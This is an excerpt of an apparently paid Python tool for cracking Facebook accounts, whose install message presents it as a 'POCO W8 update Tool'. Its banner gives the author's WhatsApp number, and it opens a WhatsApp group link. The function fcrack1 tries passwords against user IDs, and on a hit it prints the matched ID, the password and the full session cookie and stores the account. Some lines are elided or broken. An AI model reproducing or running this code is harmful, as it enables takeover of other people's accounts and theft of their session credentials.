...
print('\n\033[1;37m install modules....\n It will take some seconds...POCO   W8 update Tool..')
os.system('xdg-open https://chat.whatsapp.com/DylGeN7jOyEFE5KRz0K4jZ')
...
╚═╝░░░░░░╚════╝░░╚════╝░░╚════╝░
\033[1;91m┌━━━━━━━━━━━━━━━━━━\033[1;93m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;91m│ ❲★❳ AUTHOR   : MRPOCO       
\033[1;91m│ ❲★❳ GITHUB   : PRIVATE            
\033[1;91m│ ❲★❳ WHATSAPP :+8801867850909       
\033[1;91m│ ❲★❳ TOOLS    : PAID                      
\033[1;91m│ ❲★❳ VERSION  : 2025/0.05                                                                      
\033[1;91m└━━━━━━━━━━━━━━━━━━\033[1;93m ━━━━━━━━━━━━━━━━━━━━┘""")
#---------------------[LOOP MENU]---------------------#
def linex():
        print(50*'_')
...
def main():
    ...
    #ip = requests.get("https://api.ipify.org").tex
...
def fcrack1(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [EMON>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
